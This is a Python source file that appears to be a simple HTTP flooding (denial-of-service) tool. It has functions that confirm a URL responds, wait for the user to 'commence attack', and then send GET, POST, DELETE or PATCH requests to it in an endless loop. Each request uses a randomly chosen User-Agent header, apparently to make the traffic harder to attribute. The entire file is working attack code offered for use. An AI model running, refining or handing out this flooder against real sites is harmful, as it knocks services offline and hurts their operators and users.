import requests, random

def header():
    with open("Dependencies/agents.txt") as f:
        user_agent = random.choice([agent for agent in f.read().splitlines()])

    header = {
        "User-Agent" : user_agent
    }

    return header

def is_valid(url):
    try:
        requests.get(url)
        return True
    except:
        return False


def post(url, code):
    sent = 0
    if is_valid(url):
        input("[+] {} is a valid endpoint. Press enter to commence attack.".format(url))
        while True:
            sent += 1
            headers = header()
            con = requests.post(url, headers=header())
            if con.status_code == 501:
                input("\n[-] Endpoint is not designed for post requests.")
                break
            elif con.status_code == code:
                print("(+) Succesfully sent {request} post requests to {endpoint}".format(request=sent, endpoint=url), end='\r')


def get(url, code):
    sent = 0
    if is_valid(url):
        input("[+] {} is a valid endpoint. Press enter to commence attack.".format(url))
        while True:
            sent += 1
            headers = header()
            con = requests.get(url, headers=header())
            if con.status_code == 501:
                input("\n[-] Endpoint is not designed for get requests.")
                break
            elif con.status_code == code:
                print("(+) Succesfully sent {request} get requests to {endpoint}".format(request=sent, endpoint=url), end='\r')


def delete(url, code):
    sent = 0
    if is_valid(url):
        input("[+] {} is a valid endpoint. Press enter to commence attack.".format(url))
        while True:
            sent += 1
            headers = header()
            con = requests.delete(url, headers=header())
            if con.status_code == 501:
                input("\n[-] Endpoint is not designed for delete requests.")
                break
            elif con.status_code == code:
                print("(+) Succesfully sent {request} delete requests to {endpoint}".format(request=sent, endpoint=url), end='\r')

def patch(url, code):
    sent = 0
    if is_valid(url):
        input("[+] {} is a valid endpoint. Press enter to commence attack.".format(url))
        while True:
            sent += 1
            headers = header()
            con = requests.patch(url, headers=header())
            if con.status_code == 501:
                input("\n[-] Endpoint is not designed for patch requests.")
                break
            elif con.status_code == code:
                print("(+) Succesfully sent {request} patch requests to {endpoint}".format(request=sent, endpoint=url), end='\r')